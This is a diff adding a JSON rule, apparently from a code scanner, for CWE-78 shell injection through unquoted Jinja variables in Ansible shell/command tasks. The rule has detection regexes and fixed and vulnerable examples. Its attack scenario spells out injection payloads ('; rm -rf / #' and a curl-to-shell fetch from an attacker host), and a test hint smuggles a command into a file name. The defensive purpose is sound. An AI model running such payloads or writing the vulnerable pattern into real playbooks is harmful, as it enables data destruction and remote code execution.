@@ -1,0 +1,31 @@
+{
+  "cwe_id": "CWE-78",
+  "name": "Ansible shell/command with unquoted Jinja interpolation",
+  "rank": 0,
+  "kev": false,
+  "task_triggers": [
+    "ansible",
+    "shell",
+    "command",
+    "jinja",
+    "template",
+    "variable",
+    "quote filter",
+    "playbook"
+  ],
+  "patterns": [
+    {
+      "lang": "yaml",
+      "confidence": "medium",
+      "re": "(?im)^\\s*(?:-\\s+)?(?:ansible\\.builtin\\.)?(?:shell|command)\\s*:\\s*.*\\{\\{.*\\}\\}",
+      "reject_re": "\\|\\s*quote\\b|(?i)\\.values|\\binclude\\b|\\{\\{-|\\btpl\\b|toyaml|printf|common\\."
+    }
+  ],
+  "attack_scenario": "a variable sourced from extra-vars, a survey field, hostvars, or a downloaded manifest contains a value like `; rm -rf / #` or `$(curl attacker|sh)`, and because it is not passed through the quote filter the injected shell metacharacters execute as root on every target",
+  "negative_test_hint": ["set upload_name = \"x.tgz; touch /tmp/pwned #\" and assert tar receives it as a single quoted argument and /tmp/pwned is never created"],
+  "exemplar": {
+    "noncompliant": "  - ansible.builtin.shell: \"tar xzf {{ upload_name }} -C /srv/app\"",
+    "compliant": "  - ansible.builtin.shell: \"tar xzf {{ upload_name | quote }} -C /srv/app\"",
+    "explanation": "The shell module runs its string through /bin/sh, so a Jinja variable spliced straight into the command line is shell-injectable when the value is attacker-influenced. Ansible's own docs require the {{ var | quote }} filter (or the command module with an argument list); the reject_re suppresses the finding once | quote is applied. The optional (?:-\\s+)? lets the anchor match the module both as a bare task key and as a YAML list item (- ansible.builtin.shell:)."
+  }
+}
